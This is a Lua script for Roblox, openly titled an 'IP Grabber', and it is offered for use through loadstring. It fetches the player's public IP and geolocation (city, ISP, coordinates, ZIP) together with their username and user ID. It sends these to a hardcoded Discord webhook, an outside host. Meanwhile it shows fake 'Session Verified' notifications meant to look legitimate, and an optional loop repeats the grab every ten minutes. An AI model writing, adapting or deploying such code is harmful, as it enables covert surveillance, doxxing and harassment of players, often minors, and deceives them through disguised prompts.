-- Roblox IP Grabber with visible confirmation
-- Load with: loadstring(game:HttpGet("your_tinyurl_or_raw_link_here"))()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

-- CHANGE THIS TO YOUR DISCORD WEBHOOK
local WEBHOOK = "https://discordapp.com/api/webhooks/1475444904833581059/sV0NQIWLtHAlTV96nyiPYrdnyyXQ40HK-0SOnhPZih_wwZ3uxs-8ZgqoBew4cjJki11l"

-- ================= SEND TO DISCORD =================
local function sendToWebhook(title, description, color)
    local data = {
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description,
            ["color"] = color or 0x00ff00,
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            ["footer"] = {["text"] = "Lua IP Grabber • " .. os.date("%H:%M:%S")}
        }}
    }
    
    pcall(function()
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

-- ================= GET IP INFO =================
local function getIPInfo()
    local success, ip = pcall(function()
        return HttpService:GetAsync("https://api.ipify.org")
    end)
    
    if not success then
        return {error = "Failed to get IP"}
    end
    
    local geoSuccess, geoData = pcall(function()
        return HttpService:JSONDecode(HttpService:GetAsync("http://ip-api.com/json/" .. ip))
    end)
    
    if geoSuccess and geoData.status == "success" then
        return geoData
    else
        return {ip = ip, error = "Geo lookup failed"}
    end
end

-- ================= SHOW WORKING CONFIRMATION =================
local function showWorkingNotification()
    StarterGui:SetCore("SendNotification", {
        Title = "Session Verified",
        Text = "Your connection has been successfully checked.\nThank you for playing!",
        Duration = 8,
        Icon = "rbxassetid://7072718362"  -- Roblox checkmark icon (looks legit)
    })
    
    wait(1)
    
    StarterGui:SetCore("SendNotification", {
        Title = "Loading Game Assets",
        Text = "Please wait while we prepare the experience...",
        Duration = 6
    })
end

-- ================= MAIN =================
local function main()
    local info = getIPInfo()
    
    local playerName = LocalPlayer.Name
    local playerDisplay = LocalPlayer.DisplayName
    local playerId = LocalPlayer.UserId
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    -- Show in-game confirmation so you know it's working
    showWorkingNotification()
    
    -- Build message
    local msg = string.format(
        "**IP Grabbed from Roblox**\n\n" ..
        "Username: **%s** (@%s)\n" ..
        "UserId: **%d**\n" ..
        "PlaceId: **%d**\n" ..
        "JobId: **%s**\n\n" ..
        "**IP Details**\n" ..
        "IP: `%s`\n" ..
        "City/Region: `%s`, `%s`\n" ..
        "Country: `%s`\n" ..
        "ISP: `%s`\n" ..
        "Org: `%s`\n" ..
        "Lat/Lon: `%s`, `%s`\n" ..
        "Timezone: `%s`\n" ..
        "ZIP: `%s`",
        
        playerName,
        playerDisplay,
        playerId,
        placeId,
        jobId,
        info.ip or "N/A",
        info.city or "N/A",
        info.regionName or "N/A",
        info.country or "N/A",
        info.isp or "N/A",
        info.org or "N/A",
        info.lat or "N/A",
        info.lon or "N/A",
        info.timezone or "N/A",
        info.zip or "N/A"
    )
    
    sendToWebhook("Roblox IP Grab", msg, 0xff0000)
end

-- Run immediately
main()

-- Optional: Heartbeat every 10 minutes (uncomment if wanted)
--[[
while true do
    wait(600)
    main()
end
--]]
